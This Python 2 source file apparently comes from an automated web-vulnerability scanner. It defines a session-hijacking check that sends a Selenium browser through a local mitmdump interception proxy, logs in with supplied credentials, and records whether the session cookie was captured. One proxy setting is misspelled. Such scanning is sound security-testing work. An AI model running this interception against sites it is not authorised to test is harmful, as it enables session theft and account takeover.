from attack import Attack
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import subprocess
import time
import json
import os

class SessionHijackingAttack(Attack):
    def __init__(self, link, form_parameter, button, cookie):
        super(SessionHijackingAttack, self).__init__(link, form_parameter, button, cookie, "session_hijacking")

    def perform(self):
        print "start session_hijacking_attack."
        print "=============== TRY: session hijacking attack ========================"
        profile = webdriver.FirefoxProfile()
        profile.set_preference("network.proxy.type", 1)
        profile.set_preference("network.proxy.http", "127.0.0.1")
        profile.set_preference("network.proxy.https", "127.0.0.1")
        profile.set_preference("network.proxy.ssl", "127.0.0.1")
        profile.set_preference("network.proxy.ftp", "127.0.0.1")
        profile.set_preference("network.proxy.socks", "127.0.0.1")
        profile.set_preference("network.proxy.http_port", 8080)
        profile.set_preference("networky.proxy.https_port", 8080)
        profile.set_preference("network.proxy.ssl_port", 8080)
        profile.set_preference("network.proxy.ftp_port", 8080)
        profile.set_preference("network.proxy.socks_port", 8080)
        profile.set_preference("general.useragent.override","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A")
        profile.update_preferences()
        wd = webdriver.Firefox(firefox_profile=profile)
        subprocess.Popen(["nohup", "mitmdump", "-s", "mitm_scripts/mitm_session_hijacking.py"])
        with open('tmp_cookie.txt', 'w+') as f:
            f.write(self.cookie["name"])

        time.sleep(1)
        wd.get(self.link)
        wd.find_element_by_xpath("//input[@name='" + self.form_parameter["account"] + "']").send_keys(self.form_parameter["account_value"])
        wd.find_element_by_xpath("//input[@name='" + self.form_parameter["password"] + "']").send_keys(self.form_parameter["password_value"])
        wd.find_element_by_xpath("//input[@value='" + self.button + "']").click()

        time.sleep(1)
        if os.path.isfile("tmp_cookie_value.txt") and os.stat("tmp_cookie_value.txt").st_size > 0:
            print "CONFIRMED: session hijacking attack successful."
            exploit = {
                "page": self.link,
                "cookie": [{
                    "name": self.cookie["name"],
                    "secure": self.cookie["secure"],
                    "httpOnly": self.cookie["httpOnly"],
                    "attack": "sessionHijacking"
                }]
            }
            self.phase4_output(exploit)
        else:
            print "CONFIRMED: session hijacking attack unsuccessful."
        subprocess.Popen("kill $(ps -efw | grep mitmdump | grep -v grep | awk '{print $2}')", shell=True)
        subprocess.Popen("rm nohup.out", shell=True)
        subprocess.Popen("rm tmp_cookie.txt", shell=True)
        subprocess.Popen("rm tmp_cookie_value.txt", shell=True)
        wd.close()

    def phase4_output(self, source):
        try:
            if os.stat("phase4output.json").st_size > 0:
                with open('phase4output.json') as f:
                    data = json.load(f)
                data.append(source)
                with open('phase4output.json', 'w') as f:
                    json.dump(data, f)
            else:
                with open('phase4output.json', 'w') as f:
                    json.dump([source], f)
        except OSError:
            with open('phase4output.json', 'w+') as f:
                json.dump([source], f)
